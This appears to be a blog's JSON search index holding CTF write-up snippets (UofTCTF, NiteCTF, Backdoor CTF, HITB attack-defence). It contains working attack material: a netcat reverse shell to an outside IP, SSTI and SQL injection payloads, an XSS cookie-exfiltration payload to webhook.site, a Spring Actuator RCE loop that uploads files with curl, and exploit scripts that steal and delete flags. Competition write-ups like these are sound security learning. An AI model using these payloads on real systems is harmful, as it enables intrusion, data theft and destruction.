key:\\xa7\\\\r\\\\r\\\\n\\\\x00\\\\x00\\\\x00\\\\x00:\\\\xbe\\\\xf5e;\\\\x00\\\\x00\\\\x00\\\\xe3\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\xf3\\\\n\\\\x00\\\\x00\\\\x00\\\\x97\\\\x00d\\\\x00Z\\\\x00d\\\\x01S\\\\x00)\\\\x02\\\\xda Rm7GbQJ4uDikyiis6miD7YwsN11rEjfLN)\\\\x01\\\\xda\\\\x16session_encryption_key\\\\xa9\\\\x00\\\\xf3\\\\x00\\\\x00\\\\x00\\\\x00\\\\xfa*/var/www/keep-dreaming-sonny-boy/config.py\\\\xfa\\\\x08&amp;lt;module&amp;gt;r\\\\x07\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00s\\\\x11\\\\x00\\\\x00\\\\x00\\\\xf0\\\\x03\\\\x01\\\\x01\\\\x01\\\\xd8\\\\x19;\\\\xd0\\\\x00\\\\x16\\\\xd0\\\\x00\\\\x16\\\\xd0\\\\x00\\\\x16r\\\\x05\\\\x00\\\\x00\\\\x00Then I simply used flask-unsign like so:flask-unsign --sign --cookie &quot;{&#39;admin&#39;: True}&quot; --secret &quot;Rm7GbQJ4uDikyiis6miD7YwsN11rEjfL&quot;Copy this to your session cookie and visit /flag to solve it.kalmar{Rem3Mbr_T0_fl0sh!}" }, { "title": "UofTCTF 2024 Challenge Writeups", "url": "/posts/UofTCTF_2024/", "categories": "Jeopardy", "tags": "ctf, web, forensics", "date": "2024-01-17 00:00:00 +0000", "snippet": "Writeupsweb/Voice ChangerSourceless web challenge.Just a file upload with a pitch option. I intercepted the HTTP request and modified the pitch value.POST /upload HTTP/1.1------WebKitFormBoundaryHis6nSAKTnz412swContent-Disposition: form-data; name=&quot;pitch&quot;randomness------WebKitFormBoundaryHis6nSAKTnz412swContent-Disposition: form-data; name=&quot;input-file&quot;; filename=&quot;&quot;Content-Type: application/octet-stream------WebKitFormBoundaryHis6nSAKTnz412sw--The “randomness” value is reflected in our output from a ffmpeg command. I tried command injection and noticed shell errors were being printed.I managed to get a reverse shell by passing a&quot; ||nc 54.174.18.49 3000 -e sh; and found the flag located at /secret.txt location.uoftctf{Y0UR Pitch IS 70O H!9H}web/The VarsityWe have a javascript app with source this time. We can identify that the flag is located in the article array as part of the last element:const articles = [ { &quot;title&quot;: &quot;Pioneering the Future: UofT&#39;s Revolutionary AI Research&quot;, &quot;content&quot;: &quot;The University of Toronto continues to lead groundbreaking research in artificial intelligence, with its latest project aiming to develop algorithms that can understand emotions in text. Spearheaded by a team of international students, this initiative promises to revolutionize how machines interact with human language.&quot; }, ... { title: &quot;UofT Hosts its 2nd Inaugural Capture the Flag Event&quot;, content: &quot;Your flag is: &quot; + FLAG, },];So we just need to read the article which contains this flag. I notice when trying to read this article I get blocked by the following line:if (decoded.subscription !== &quot;premium&quot; &amp;amp;&amp;amp; issue &amp;gt;= 9) { return res .status(403) .json({ message: &quot;Please subscribe to access this issue&quot; }); }This is because it has id of 9. We need to pass in a value which is NOT &amp;gt;= 9 but will read the final element of the array when it hits the following line:return res.json(articles[issue]);My initial thought was to pass in -1 because in Python that can be used to access the last element of a list. Then I remembered that unfortunately this was written in Javascript!But one line peaked my interest which sat after the numerical check but before the return:issue = parseInt(issue);Can we pass a value which is considered NOT &amp;gt;= 9 but when passed into parseInt() returns 9? Well, it turns out that any letters appended to javascript’s parseInt() are truncated.POST /article HTTP/1.1{&quot;issue&quot;:&quot;9a&quot;}And we get our flag.uoftctf{w31rd_b3h4v10r_0f_parseInt()!}web/No CodeThis time we just get a standalone Python source file. We can see the application is running Flask and there is only one endpoint to interact with.@app.route(&#39;/execute&#39;, methods=[&#39;POST&#39;])def execute_code(): code = request.form.get(&#39;code&#39;, &#39;&#39;) if re.match(&quot;.*[\\x20-\\x7E]+.*&quot;, code): return jsonify({&quot;output&quot;: &quot;jk lmao no code&quot;}), 403 result = &quot;&quot; try: result = eval(code) except Exception as e: result = str(e) return jsonify({&quot;output&quot;: result}), 200Okay, so we obviously need to find a way to hit the eval and execute our code. At first, I assumed this was a PyJail challenge but since it was extremely strict I started to think there had to be a means to bypass the regex check.Then I recalled that re.match() only matches the first line. So, by passing in a newline first we can inject our payload to be eval’d afterwards.POST /execute HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 31code=%0aopen(&#39;flag.txt&#39;).read()Don’t forget your Content-Type header when creating the request! I ended up just using the open call and guessing the flag name instead of any fancy RCE approaches.uoftctf{r3g3x_3p1c_f41L_XDDD}web/GuestbookSomeone else on the team solved this so they can write it up.web/My First AppNo source for this challenge.With the only option being to set a username it seemed obvious this would have to be some sort of injection attack. I tried immediately sending a SSTI payload but was blocked by a client-side pattern match. I removed the client-side check and sent the payload but was greeted with the error Username must be alphanumeric. which seems pretty strict.Without much else to go on, I checked the cookies and noticed it was JWT. I ran jwt_tool on this but got nothing. I also tried cracking the secret key with a basic wordlist to no avail.So I decided to load my JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlVTRVIifQ.01eSew74pkzoX1XDBW1l4AuU1Lw_VV59WDc86GY_mCc into Hashcat and run rockyou.txt on it.This recovered the JWT secret key torontobluejays pretty fast.Next I decided to sign a username containing a SSTI payload {{7*7}} and got the elusive 49. I immediately threw in a payload and hit the filter.They seemed to be blocking a lot of different things. The most important thing was figuring out which characters are blocked. Firstly, there are no square brackets which means we need to use dot notation to access most attributes. We also have no underscores which means we cannot use strings such as __globals__ or __class__ and so on. In fact, we don’t even have quotations to instantiate strings.I initially found a way to sneak in strings via parameters but passing any parameters at all hits an entirely separate block. I also found a way to sneak in parameters via POST form parameters but sending a POST request would not hit the Flask endpoint logic. I settled on finding a suitable HTTP header to sneak strings through.The header could not contain an underscore though and so the most suitable seemed to be Pragma. If we send duplicate pragma headers then it becomes an array and we can access the offsets using dot notation request.pragma.0 so I settled on using the following lipsum payload:{{lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)|attr(&quot;__builtins__&quot;)|attr(&quot;__import__&quot;)|attr(&quot;os&quot;)|attr(&quot;popen&quot;)|attr(&quot;cat flag.txt&quot;)|attr(&quot;read&quot;)()}}Which when replaced with our pragma headers becomes:{{lipsum|attr(request.pragma.0)|attr(request.pragma.1)(request.pragma.2)|attr(request.pragma.1)(request.pragma.3)(request.pragma.4)|attr(request.pragma.5)(request.pragma.6)|attr(request.pragma.7)()}}And our HTTP headers will include:Pragma: __globals__Pragma: __getitem__Pragma: __builtins__Pragma: __import__Pragma: osPragma: popenPragma: cat flag.txtPragma: readAnd that got us the second solve on this challenge!uoftctf{That_firewall_salesperson_scammed_me_:(}web/Jay’s BankSo we are given a javascript source with a mysql database. Firstly, we should check the routes and aside from the typical login/register we have a /profile PUT endpoint which allows us to modify our user account.await db.updateData( username, db.convert({ phone, credit_card, secret_question, secret_answer, role: &quot;user&quot;, }) );It will then update our data in the database. Notice that inside of the call to db.updateData() there is a call to db.convert() so let’s pull up the source for that:convert(o) { console.log(`{${Object.entries(o).map(([k, v]) =&amp;gt; `&quot;${k}&quot;: ${typeof v === &quot;object&quot; &amp;amp;&amp;amp; v !== null ? convert(v) : `&quot;${v}&quot;`}` ).join(&quot;, &quot;)}}`.toLowerCase()); return `{${Object.entries(o).map(([k, v]) =&amp;gt; `&quot;${k}&quot;: ${typeof v === &quot;object&quot; &amp;amp;&amp;amp; v !== null ? convert(v) : `&quot;${v}&quot;`}` ).join(&quot;, &quot;)}}`.toLowerCase(); }Immediately I guessed this would be prototype pollution as it is a javascript application (where such attacks are common) and we are seeing some references to Object but after further checks I didn’t really see any potential to overwrite that. Let’s just analyze what this method does.It takes an object o and recursively creates a string representation of this object. Normally I would expect just a call to JSON.stringify so this looked very suspicious. I noticed that if a value contains a quotation (&quot;) then it will break out of the value and allow us to add additional parameters. Normally, a call to update our profile with a secret_answer set to abc will result in the following object being saved:{&quot;phone&quot;: &quot;1111111111&quot;, &quot;credit_card&quot;: &quot;1111111111111111&quot;, &quot;secret_question&quot;: &quot;aaa&quot;, &quot;secret_answer&quot;: &quot;abc&quot;, &quot;role&quot;: &quot;user&quot;}But if we instead set our secret_answerto abc&quot;, &quot;role&quot;: &quot;admin then it will become:{&quot;phone&quot;: &quot;1111111111&quot;, &quot;credit_card&quot;: &quot;1111111111111111&quot;, &quot;secret_question&quot;: &quot;aaa&quot;, &quot;secret_answer&quot;: &quot;a&quot;, &quot;role&quot;: &quot;admin&quot;, &quot;role&quot;: &quot;user&quot;}This however, will not work because JSON.parse() will take the last value of role to be true, so it will overwrite our injected &quot;role&quot;: &quot;admin&quot; value.We can bypass this though by looking at the database specification.CREATE TABLE users ( id INT NOT NULL AUTO_INCREMENT, username NVARCHAR(255) NOT NULL, password NVARCHAR(255) NOT NULL, data NVARCHAR(255) NOT NULL, PRIMARY KEY (id));Notice that the field we are storing to (data) is maximum length of 255. If we have data greater in length than this, then it will be truncated and we can slice off the part which defines our role as user! Unfortunately, there are length checks on phone (must be 10) and credit_card (must be 16) and these both must be numbers so we can’t do much there. Under secret_question and secret_answer we are also limited to just 45 each. In total, that is around 150 characters when including all the curly braces and quotation.You will however, notice that there is a call to String.toLowerCase() on the convert function. This is great, because there is one single character in javascript (İ) which has a length of 1 but after passing through the String.toLowerCase() function its length becomes 2.So we PUT /profile with the following payload:{ &quot;phone&quot;:&quot;1111111111&quot;, &quot;credit_card&quot;:&quot;1111111111111111&quot;, &quot;secret_question&quot;:&quot;İİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİ&quot;, &quot;secret_answer&quot;:&quot;İİİİİİİİİİİİİİİİİİİİİİİİ\\&quot;,\\&quot;role\\&quot;:\\&quot;admin\\&quot;}&quot;, &quot;current_password&quot;:&quot;;)&quot;}And we log back in and fetch our flag! Hope you enjoyed the writeups.forensics/Illusion WriteupWe’re given a PCAP file with a lot of traffic to and from one IP address. Looking into it, its mainly http traffic, with some calls to a cloned Google.com page, and a get request for an image. The requests to the images caught my interest, as they don’t return any image data, just a 200OK.The GUID string looks like base64, but doesn’t decode to anything.After a bit of Googling I came across this Medium blog talking about the trevorC2 Framework. In this post it mentions how the C2 framework will clone a webpage like Google.com, then it will send the C2 server data through the /images?guid parameter. Heres the config for the C2 Server.URL = (&quot;https://www.google.com&quot;) # URL to clone to house a legitimate websiteUSER_AGENT = (&quot;User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko&quot;)ROOT_PATH_QUERY = (&quot;/&quot;)# THIS FLAG IS WHERE THE CLIENT WILL SUBMIT VIA URL AND QUERY STRING GET PARAMETERSITE_PATH_QUERY = (&quot;/images&quot;)# THIS IS THE QUERY STRING PARAMETER USEDQUERY_STRING = (&quot;guid=&quot;)# THIS IS THE NAME USED IN THE COOKIE FOR THE COMMUNICATION SESSIONIDCOOKIE_SESSIONID_STRING = (&quot;sessionid&quot;)# THIS IS THE LENGTH OF THE COMMUNICATION SESSIONIDCOOKIE_SESSIONID_LENGTH = (15)# STUB FOR DATA - THIS IS USED TO SLIP DATA INTO THE SITE, WANT TO CHANGE THIS SO ITS NOT STATICSTUB = (&quot;oldcss=&quot;)# Turn to True for SSL supportSSL = FalseCERT_FILE = (&quot;&quot;) # Your Certificate for SSL# THIS IS OUR ENCRYPTION KEY - THIS NEEDS TO BE THE SAME ON BOTH SERVER AND CLIENT FOR APPROPRIATE DECRYPTION. RECOMMEND CHANGING THIS FROM THE DEFAULT KEYCIPHER = (&quot;Tr3v0rC2R0x@nd1s@w350m3#TrevorForget&quot;)# Response for website when browsing directories that do not exist if directly going to SITE_PATH_QUERYNOTFOUND=(&quot;Page not found.&quot;)# Redirect the victim if browsing website to the cloned URL instead of presenting it. ON/OFFREDIRECT =(&quot;ON&quot;)This all matches what we found in the PCAP. So it’s safe to assume its using the TrevorC2 to communicate.Looking at the source code we can see that to decode the transferred data we need to base64 decode it, then decrypt the AES.def __init__(self, key): self.bs = 16 self.key = hashlib.sha256(AESCipher.str_to_bytes(key)).digest()...def decrypt(self, enc): enc = base64.b64decode(enc) iv = enc[:AES.block_size] cipher = AES.new(self.key, AES.MODE_CBC, iv) return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode(&#39;utf-8&#39;)From this snippet we know that the IV is the first 16 bytes of the data, and the cipher is the sha256 of the key, which was Tr3v0rC2R0x@nd1s@w350m3#TrevorForget.Using this information we can use cyberchef to make a recipe to decode the GUID data, we had to use 2 Base64 decodes rather than one. I’m assuming this is from the client base64 encoding it to send over HTTP. However, the flag is not in any of the exfil data. We do find that a flag.txt was created on the analysts desktop. As well as other traffic showing that there was a reverse shell on the system.The next step was the decode the instructions from the C2, to see if any of the commands contain the flag. The instructions from the C2 are taken from a commented stub at the bottom of the cloned Google pages. The C2 Instructions are encoded similar to the the guid data, but there is only 1 base64 encoding. There’s a lot of requests with the oldcss stub, so I exported all the HTML objects, and then used grep to find all the matches.The longest string caught my attention so I tried that first, and got the flag.uoftctf{Tr3V0r_C2_1s_H4rd_T0_D3t3c7}" }, { "title": "NiteCTF 2023 Challenges", "url": "/posts/NiteCTF_2023/", "categories": "Jeopardy", "tags": "ctf, web, pwn, prototype pollution", "date": "2023-12-19 00:00:00 +0000", "snippet": "WriteupsThese are two challenges which I found interesting from NiteCTF. Just 1x pwn and 1x web.web/Mini SurveyDownloading the source, we see this is a Javascript challenge immediately observing some unusual practices:surveyOneInitialData[fieldInput1] = { [fieldInput2]: fieldInput3 };Placing user input into square bracket notation such as the above can lead to Prototype Pollution in objects. Judging by the fact that this endpoint is named PollutionSurvey and the various Object operations occuring we can probably assume this challenge will entail some Prototype Pollution.app.post(&quot;/pollutionsurvey&quot;, (req, res) =&amp;gt; { let fieldInput1 = req.body.name; let fieldInput2 = req.body.city; let fieldInput3 = req.body.pollutionRate; surveyOneInitialData[fieldInput1] = { [fieldInput2]: fieldInput3 }; surveyOneInitialData = updateDBs(surveyOneInitialData, { Name: { City: &quot;Rating&quot; }, }); res.redirect(&quot;/thankyou&quot;);});This is the full endpoint. We may pollute the object however we wish and it will be passed into an updateDBs() function call. This function is defined below.function updateDBs(dataObj, original) { let commData = Object.create(dataObj); commData[&quot;flag&quot;] = &quot;nite{FAKE_FAKE_FAKE_FLAG}&quot;; commData[&quot;log&quot;] = &quot;new entry added&quot;; sendData(commData); return original;}So it is going to instantiate an Object using Object.create(dataObj) where dataObj is our polluted Object instance. It will then append the flag to the data object and pass this new data object to the sendData() function.function sendData(data) { const postData = JSON.stringify(data); if (data.host != undefined) { backupServerHost = data.host; } if (data.port != undefined) { backupServerPort = data.port; } const options = { host: backupServerHost || &quot;localhost&quot;, port: backupServerPort || &quot;8888&quot;, }; if ( typeof options.host === &quot;string&quot; &amp;amp;&amp;amp; options.host.endsWith(&quot;.ngrok.io&quot;) ) { const socket = net.connect(options, () =&amp;gt; { socket.write(postData); socket.end(); }); socket.on(&quot;error&quot;, (err) =&amp;gt; { console.error(&quot;Error&quot;, err.message); }); }}There’s quite a bit to unpack here. We may define a data.host or a data.port which will update the backupServerHost and backupServerPort variables respectively.Our host must be of type string and end with .ngrok.io which hints towards us using the ngrok service to retrieve the flag. From here, the attack should be a bit more obvious.Back to the endpoint, particularly the line containing surveyOneInitialData[fieldInput1] = { [fieldInput2]: fieldInput3 };. We will need to define fieldInput1 as __proto__ to pollute the prototype. We will then define fieldInput2 as host and fieldInput3 as our ngrok URL. The default port will be 8888.However, we may also pollute the port separately. Because these are globalized variables they will be set to whatever value they were last polluted to.I am not a fan of the ngrok service. There are many issues with using it for this challenge (specifying ports, requiring user confirmation before accepting requests, etc). As such, I tried to bypass this using a nullbyte. We can pass our host as myhost.com%00.ngrok.io and it will send the data to myhost.com due to the nullbyte termination. This was unintended but certainly useful.So I opened up a reverse shell connection using nc -lvnp 1337 and then sent a request to the website to pollute the port variable to 1337:name=__proto__&amp;amp;city=port&amp;amp;pollutionRate=1337After this, I simply polluted the host variable to send it to my IP address 1.3.3.7 to collect.name=__proto__&amp;amp;city=host&amp;amp;pollutionRate=1.3.3.7%00.ngrok.ioThen we get the flag!nite{pr0t0_p0llut3d_116a4601b79d6b8f}pwn/The road not takenThis was a pretty fun binary exploitation challenge. Running checksec we see that there is no canary and Partial RELRO but PIE and NX are both enabled.Opening in Ghidra we can get an idea of what it’s doing.void main(void){ undefined buf [520]; code *wrongdirection; setbuf(stdout,(char *)0x0); setbuf(stdin,(char *)0x0); wrongdirection = ::wrongdirection; puts(&quot;Can you please lead me to the right direction to get to the flag?&quot;); read(0,buf,522); (*wrongdirection)(); return;}So it’s instantiating a stack variable containing a pointer to a function which it later calls. This is always pretty dangerous as stack variables can be a lot more susceptible to buffer overflow attacks. We can see the buffer in this case is 520 bytes but the call to read() allows us to write 522 bytes to the stack. This is a 2 byte overflow.Given that PIE is enabled, it would be unrealistic for us to overflow to anything useful (given the address randomization). As such, it became obvious that we would be using this two byte overflow to partially modify the pointer address by changing the last 2 bytes to point to something more useful.We can see the functions below.0x0000000000001000 _init0x0000000000001030 puts@plt0x0000000000001040 setbuf@plt0x0000000000001050 read@plt0x0000000000001060 _start0x0000000000001159 rightdirection0x000000000000117e wrongdirection0x0000000000001194 main0x0000000000001208 _finiIt’s pretty clear that we need to overflow to the rightdirection function. From running the binary and analyzing with pwndbg I noticed that PIE was randomizing the addresses each run but the last byte remained the same. Since we can overflow the last 2 bytes, we know we will want to overflow a \\x59 to correspond to rightdirection but we don’t know the correct byte preceding this.However, there’s only 256 possible bytes so we can just brute force this. My script is below.from pwn import *local = Falsecontext.log_level = &#39;error&#39;for i in range(256): if local: p = process(&#39;./the_road_not_taken1&#39;) else: p = remote(&#39;34.100.142.216&#39;, 1337) print(p.recv()) payload = b&quot;A&quot;*520 payload += &quot;Y&quot;.encode() + chr(i).encode() try: p.sendline(payload) print(p.recvuntil(b&quot;}&quot;)) break except EOFError: passWhen running it, we eventually get our flag.nite{R0b3rT_fro5t_ftw_32dx5hp}" }, { "title": "Backdoor CTF 2023 Web Challenges", "url": "/posts/Backdoor_CTF_2023_Web/", "categories": "Jeopardy", "tags": "ctf, web", "date": "2023-12-18 00:00:00 +0000", "snippet": "web/too-many-adminsDownloading the source, we can see this is a PHP challenge. Just a single PHP file and the flag is located in the database (dump.sql).I immediately noticed the SQL injection here:$query = &quot;SELECT username, password, bio FROM users where username = &#39;$userParam&#39; &quot;;Trying a simple blind SQLi payload 1&#39;or&#39;1&#39;=&#39;1 on the user GET parameter reveals the entire database (limited to id, user and password).I immediately noticed many of the hashes were Magic Hashes.This is a hash which begins with 0e followed by a string of numerical values. PHP has a difficult time with these hashes because it evaluates them to be loosely equal to zero due to PHP treating e as a symbol for an exponent.So I wrote up a script to try 240610708 as the password for each admin user (there are 500).While this script was running, I realized that the SQL injection vulnerability would actually allow us to dump the flag if we use a UNION query. Since the flag is stored in the bio column, we can simply use 1&#39; UNION SELECT null, bio, null FROM users-- - to dump the flag.In the end, both techniques worked. Judging from the flag, the intended solution was actually the magic hash approach.flag{1m40_php_15_84d_47_d1ff323n71471n9_7yp35}web/php-sucksOpening the source for this challenge we notice the flag is a file on the server this time. With only a file upload, it is pretty clear that we will require an arbitrary file upload vulnerability to read the flag.All the PHP code was in a single line so the first thing I did was paste this into a PHP beautifier. This made it easier to see what was happening in the code.The implementation looked pretty secure. However, there was one line in particular that I didn’t like:$fileName=strtok($fileName,chr(7841151584512418084));This modified the filename; splitting it by a token and taking the first instance of the resulting array. What’s strange is that chr(7841151584512418084) doesn’t correspond to a normal character. I decided to run this PHP code and see what symbol it corresponded to and was pleasantly surprised that it was $.So, we can upload a file named shell.php$.jpg and we will pass the initial file extension checks, ensure that the mimetype check is also satisfied. Then, it will be later renamed to shell.php by the aforementioned call to strtok().So uploading an image containing PHP code somewhere inside it (which is still a valid image) will work. After uploading, I found the flag and ran the command to view it cat ../../s0_7h15_15_7h3_fl496_y0u_ar3_54rch1n9_f0r.txt.flag{n0t_3v3ry_t1m3_y0u_w1ll_s33_nu11byt3_vuln3r4b1l1ty_0sdfdgh554fd}web/Unintelligible-ChatbotThis was the first sourceless challenge on the CTF. I pretty quickly tested for most obvious injection types include XSS and SSTI. Our SSTI payload seemed to work ({{7*7}} =&amp;gt; 49).From initial checks, it seems to be blocking any SSTI payloads with [] or . which means we will have a difficult time accessing dictionary values. If you’re used to SSTI challenges then you’ll know flask has a bunch of useful approaches to handle this including the |attr() method.I’d love to elaborate more on this solution but this is one of the first things I tried and it worked.{{request|attr(&#39;application&#39;)|attr(&#39;\\x5f\\x5fglobals\\x5f\\x5f&#39;)|attr(&#39;\\x5f\\x5fgetitem\\x5f\\x5f&#39;)(&#39;\\x5f\\x5fbuiltins\\x5f\\x5f&#39;)|attr(&#39;\\x5f\\x5fgetitem\\x5f\\x5f&#39;)(&#39;\\x5f\\x5fimport\\x5f\\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;cat flag&#39;)|attr(&#39;read&#39;)()}}flag{n07_4n07h3r_5571_ch4ll3n63}web/space-warI felt like this was among the more “guessier” of challenges. The description mentioned letters being split up amongst various routes. So I decided to fuzz for all printable characters and found a response at /K. I then wrote the following script to recover the other characters:import requestsimport stringo = &quot;&quot;while True: for s in string.printable: r = requests.get(f&quot;http://34.132.132.69:8005/{o}{s}&quot;) if &quot;wrong path&quot; not in r.text: o += s print(o) breakEventually after getting Kur0s4k1 we see the following message:Ohhhh myy Goddd!! you finally did it!! you are worthy, my name Kur0s4k1I then logged in with username Kur0s4k1 and password 1&quot;or&quot;1&quot;=&quot;1 which worked.flag{1_kn0w_y0u_will_c0me_b4ck_S0M3DAY_0dsf513sg445s}web/armoured-notesThis was probably my favourite challenge on the CTF. We open the source code and see the flag is stored as a cookie on the admin bot. This means we will likely require XSS to solve this challenge.However, we cannot create notes on this application as we are not an administrator. I pretty quickly noticed the dodgy usage of Object.assign() in the duplicate() method:export function duplicate(body) { let obj={} let keys = Object.keys(body); keys.forEach((key) =&amp;gt; { if(key !== &quot;isAdmin&quot;) obj[key]=body[key]; }) return obj;}After seeing the hardcoded check for isAdmin, I realized that if we could add this as a field to our note when creating it (and set it to true), we could successfully overwrite the default value. This can be done using a prototype pollution.POST /create{ &quot;uname&quot;:&quot;John&quot;, &quot;pass&quot;:&quot;Doe&quot;, &quot;__proto__&quot;: { &quot;isAdmin&quot;: true }, &quot;message&quot;:&quot;Your note...&quot;}This successfully bypassed the check and created our note. I got stuck at this point for a while until I eventually ran npm audit and discovered there was a public XSS exploit available for ViteJS.All the information needed to exploit this can be found here.Final payload which I sent to the admin bot:http://34.132.132.69:8001/posts/6580526999d634eec4c73707/?&quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;window.location.href=`https://webhook.site/77b428d2-33c2-437f-8425-9ef657cdacea/${btoa(document.cookie)}`&amp;lt;/script&amp;gt;flag{pR0707yP3_p0150n1n9_AND_v173j5_5ay_n01c3_99}web/Rocket ExplorerCredit to Protag (@0daystolive) for immediately noticing that this was vulnerable to an exposed Spring Boot Actuator (exploit here). The main challenge here was due to the server consistently crashing.I had tried to get a reverse shell for a long time but this was not working. I was able to get a pingback but had no idea where the flag was located on the server and wasn’t getting a successful backconnect from the shell payload.I ended up having to guess various flag locations and spam requests to get the flag. I wrote this bash script to guess /flag which successfully worked.while truedo curl -X &#39;POST&#39; -H &#39;Content-Type: application/json&#39; --data-binary $&#39;{\\&quot;name\\&quot;:\\&quot;spring.datasource.hikari.connection-test-query\\&quot;,\\&quot;value\\&quot;:\\&quot;CREATE ALIAS EXEC AS CONCAT(\\&#39;String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\\&#39;,\\&#39; java.util.Scanner(Runtime.getRun\\&#39;,\\&#39;time().exec(cmd).getInputStream()); if (s.hasNext()) {s.next();} throw new IllegalArgumentException(); }\\&#39;);CALL EXEC(\\&#39;curl -T /flag &amp;lt;webhook&amp;gt;\\&#39;);\\&quot;}&#39; &#39;http://34.173.50.60:8080/actuator/env&#39; curl -X &#39;POST&#39; -H &#39;Content-Type: application/json&#39; &#39;http://34.173.50.60:8080/actuator/restart&#39;doneflag{sp4c3_r4cc00ns_rc3}" }, { "title": "HITB Phuket 2023", "url": "/posts/HITB_Phuket_2023/", "categories": "Attack-Defence", "tags": "ctf, attack-defence", "date": "2023-08-26 00:00:00 +0000", "snippet": "Pure Challenge WriteupThe official writeup from the organizers is available here. I’m going to let that cover the technical details of the vulnerability as in this writeup I want to focus on the development of the exploit.Initially we got the payload from analysing Tulip logs. We noticed someone with the cookie settings=isAdmin:1 could read any contact on the platform. The contact ids for the flags are given to us by the A/D API.Another notable thing about this challenge is that attackers are able to delete the contact/flag. This means that only the first attacker (and others if they are lucky) will get the points so speed is a necessity for this exploit script to be successful.Here is the first iteration of the exploit:#!/usr/bin/python3import osimport requestsimport reimport stringimport randomimport jsonhost = os.getenv(&quot;TARGET_IP&quot;)flag_ids = json.loads(os.getenv(&quot;TARGET_EXTRA&quot;, &quot;{}&quot;))def gen_rand(): return &#39;&#39;.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(20))for flag_id in flag_ids: s = requests.Session() data = { &quot;username&quot;: gen_rand(), &quot;password&quot;: gen_rand() } try: r = s.post(f&quot;https://{host}/register&quot;, data=data) s.cookies.set(&quot;settings&quot;, &quot;isAdmin:1&quot;, domain=host) r = s.get(f&quot;https://{host}/edit/{flag_id}&quot;) flag = re.findall(r&quot;TEAM\\d{3}_[A-Z0-9]{32}&quot;, r.text)[0] print(flag) except: passWe used ataka during this CTF to manage our exploits. This gives the target and target info to our script as env variables and automates the repeated running of the exploit across the different targets. Ataka ingests the flags and submits them by using a regex on the script output.Here is the second iteration of the exploit:#!/usr/bin/python3import osimport requestsimport reimport stringimport randomimport timehost = os.getenv(&quot;TARGET_IP&quot;)def gen_rand(): return &#39;&#39;.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(20))s = requests.Session()s.cookies.set(&quot;settings&quot;, &quot;isAdmin:1&quot;, domain=host)data = { &quot;username&quot;: gen_rand(), &quot;password&quot;: gen_rand()}r = s.post(f&quot;https://{host}/register&quot;, data=data)#r = s.get(f&quot;https://{host}/&quot;) -- this line is not needed as the register request follows the redirect and returns the same informationids = list(set(re.findall(r&quot;[a-f0-9]{24}&quot;, r.text)))while len(ids)==0: time.sleep(3) r = s.get(f&quot;https://{host}/&quot;) ids = list(set(re.findall(r&quot;[a-f0-9]{24}&quot;, r.text)))for id in ids: r = s.get(f&quot;https://{host}/edit/{id}&quot;) flags = re.findall(r&quot;TEAM\\d{3}_[A-Z0-9]{32}&quot;, r.text) for flag in flags: print(flag)for id in ids: r = s.get(f&quot;https://{host}/delete/{id}&quot;)The first change we made was to avoid using the flag_ids data. Often it would be outdated when you attempt to use it as the flags will already be deleted. Instead we relied on the index of the app when viewed with the cookie, this showed all contacts from the application.If no contacts are on the app we wait 3 seconds and try again and keep doing so until one does appear. This is good because we avoid losing time rerunning the script and registering a new account.When we have ids from the index we check all of them straight away.Only after we have checked them do we make the delete requests, preventing others from getting the points comes after we’ve secured points ourselves.Third iteration:#!/usr/bin/python3import osimport requestsimport reimport stringimport randomimport timefrom sys import argvhost=argv[1]def gen_rand(): return &#39;&#39;.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(20))s = requests.Session()s.cookies.set(&quot;settings&quot;, &quot;isAdmin:1&quot;, domain=host)data = { &quot;username&quot;: gen_rand(), &quot;password&quot;: gen_rand()}r = s.post(f&quot;https://{host}/register&quot;, data=data)ids = list(set(re.findall(r&quot;[a-f0-9]{24}&quot;, r.text)))counter = 0while len(ids)==0: counter+=1 if counter==100: print(f&quot;{host} is patched?&quot;) exit() time.sleep(2) r = s.get(f&quot;https://{host}/&quot;) ids = list(set(re.findall(r&quot;[a-f0-9]{24}&quot;, r.text)))all_flags = []for id in ids: r = s.get(f&quot;https://{host}/edit/{id}&quot;) flags = re.findall(r&quot;TEAM\\d{3}_[A-Z0-9]{32}&quot;, r.text) for flag in flags: all_flags.append(flag)for flag in all_flags: print(flag) os.system(f&quot;../atk flag submit {flag}&quot;)for id in ids: r = s.get(f&quot;https://{host}/delete/{id}&quot;)One of the disadvantages of using ataka to run the exploit is that it wont run against all the hosts in parallel, only a subset (idk how many) so instead we avoided using ataka to run this one and instead chose to run it with xargs:echo &quot;python3 pure3.py $1 &amp;gt; out/$1 2&amp;gt;&amp;amp;1&quot; &amp;gt; pure.shchmod +x pure.shmkdir outcat pure_hosts.txt | xargs -n1 -P100 ./pure.shWe also added a counter to the while loop to try and weed out servers that were no longer vulnerable and stop them wasting server resources. Because we no longer used ataka for handling running the exploit we needed to submit flags a different way. I chose to invoke the atk file provided to do that but this is very slow. However overall its not too negative on our exploit - if we get to that point we’ve won a race for flags already.This exploit doesn’t loop as it was intended to just identify what servers were still vulnerable.The next version simply wrapped the exploit in an infinite while loop with a try except to avoid crashing to random http errors.Final exploit:#!/usr/bin/python3import jsonimport loggingimport reimport requestsimport timeimport stringimport randomimport timefrom sys import argvlogger = logging.getLogger()CHECKSYSTEM_TOKEN = &quot;CHECKSYSTEM_000_00000000000000000000000000000000&quot;API_HOST = &quot;https://ctf.hitb.org&quot;flag_regex = re.compile(r&quot;TEAM[0-9]*_[A-Z0-9]{32}&quot;)id_regex = re.compile(r&quot;[a-f0-9]{24}&quot;)seen = set()def submit_flags(flags): flags = list(set(flags).difference(seen)) seen.update(flags) if len(flags)==0: return 